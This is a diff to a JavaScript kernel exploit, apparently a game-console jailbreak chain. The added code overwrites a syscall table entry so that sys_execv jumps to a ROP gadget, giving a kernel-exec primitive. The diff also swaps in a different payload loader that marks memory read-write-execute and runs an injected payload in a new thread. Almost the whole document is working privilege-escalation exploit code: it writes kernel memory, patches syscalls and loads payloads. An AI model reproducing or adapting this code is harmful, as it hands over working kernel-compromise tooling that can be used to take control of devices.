@@ -142,9 +142,7 @@ const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
-var nogc = [];
 let chain = null;
-
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1471,7 +1469,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write64(w_rthdr_p, 0);
     log('corrupt pointers cleaned');
 
-    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1518,6 +1515,18 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
+
+    log('change sys_execv() to sys_kexec()');
+
+    const offset_sysent_11 = 0x1100520;
+    const sysent_11 = kbase.add(offset_sysent_11);
+
+    // .sy_narg = 2
+    kmem.write32(sysent_11, 6);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_11.add(8), kbase.add(0x4c7ad));
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_11.add(0x2c), 1);
 
     log('add JIT capabilities');
     // TODO just set the bits for JIT privs
@@ -1608,7 +1617,6 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-    
     alert("kernel exploit succeeded!");
 }
 
@@ -1743,9 +1751,7 @@ export async function kexploit() {
     }
 }
 
-//For some reason this payload loader version does KP. 
-/*kexploit().then(() => {
-    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+kexploit().then(() => {
     var payload_loader = new View4(window.pld);
     chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
     const ctx = new Buffer(0x10);
@@ -1757,45 +1763,6 @@ export async function kexploit() {
         pthread.addr,
         0,
         payload_loader.addr,
-        payload_buffer,
-    );
-})*/
-
-
-kexploit().then(() => {
-    function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
-    window.pld_size = new Int(0x26200000, 0x9);
-
-    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
-    var payload = window.pld;
-    var bufLen = payload.length * 4
-    var payload_loader = malloc32(bufLen);
-    var loader_writer = payload_loader.backing;
-    for (var i = 0; i < payload.length; i++) {
-        loader_writer[i] = payload[i];
-    }
-    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-    var pthread = malloc(0x10);
-
-    call_nze(
-        'pthread_create',
-        pthread,
         0,
-        payload_loader,
-        payload_buffer,
     );
 })
